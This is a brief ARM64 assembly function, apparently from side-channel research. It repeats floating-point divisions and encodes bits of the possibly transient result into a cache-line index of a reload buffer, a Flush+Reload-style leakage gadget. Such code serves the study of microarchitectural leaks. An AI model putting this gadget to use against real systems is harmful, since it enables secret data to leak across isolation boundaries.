//;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
// fp_leak_trans_res(uint8_t *reload_buffer, uint64_t *x, uint64_t *y, uint8_t shift)
//;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.global fp_leak_trans_res
fp_leak_trans_res:

    //Perform FP operation
    ldr     d1, [x1]
    ldr     d2, [x2]
    .rept 8
    fdiv    d0, d1, d2
    .endr

    //Leak transient result
    fmov    x1, d0
    lsr     x3, x1, x3
    ubfiz   x3, x3, 11, 4
    ldrb    w0, [x0, x3]

    //Return architectural result
    fmov    x0, d0
    ret
